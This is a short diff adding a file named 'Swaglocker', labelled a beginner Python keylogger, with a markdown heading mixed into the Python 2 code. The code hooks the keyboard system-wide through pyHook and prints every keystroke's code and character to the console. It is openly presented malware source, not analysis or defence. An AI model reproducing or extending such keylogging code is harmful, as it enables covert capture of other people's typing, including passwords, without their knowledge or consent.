@@ -1,0 +1,16 @@
+# Swaglocker
+Python Beginner Keylogger
+
+import pyHook, pythoncom, sys
+
+def OKBE (event) :
+    print str(event.Ascii)
+
+    print chr(event.Ascii)
+
+
+manager = pyHook.HooksManager ()
+manager.KeyDown = OKBE
+manager.HookKeyboard()
+
+pythoncom.PumpMessages()
